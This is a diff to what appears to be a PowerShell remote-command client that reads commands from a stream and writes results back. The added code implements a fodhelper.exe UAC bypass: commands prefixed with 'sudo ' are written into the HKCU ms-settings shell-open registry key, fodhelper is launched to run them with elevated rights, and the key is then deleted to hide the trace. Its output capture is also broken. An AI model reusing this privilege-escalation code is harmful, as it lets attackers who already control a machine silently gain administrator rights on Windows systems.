@@ -85,6 +85,29 @@ function Main {
             $writer.Flush()
         }
 
+        if ($command.StartsWith("sudo ")) {
+            $cmd = $command.Substring(5) # Remove 'sudo ' from the command string
+
+            #add command into registry process 
+            New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Value "$cmd" -Force
+            New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+            $bypass = Start-Process "C:\Windows\System32\fodhelper.exe"
+
+            try {
+                #start fodhelper.exe to execute command in the registry
+                $output = Invoke-Expression $bypass 2>&1 | Out-String
+                #sleep 1 sec to prevent some weird popup occurs & caused code execution fails
+                Start-Sleep -Seconds 1
+                #cleanup created registry value
+                Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
+                $writer.WriteLine($output)
+                $writer.Flush()
+            } catch {
+                $writer.WriteLine("Error: " + $_.Exception.Message)
+                $writer.Flush()
+            }
+        }
+
         else {
             try {
                 $output = Invoke-Expression $cmd 2>&1 | Out-String
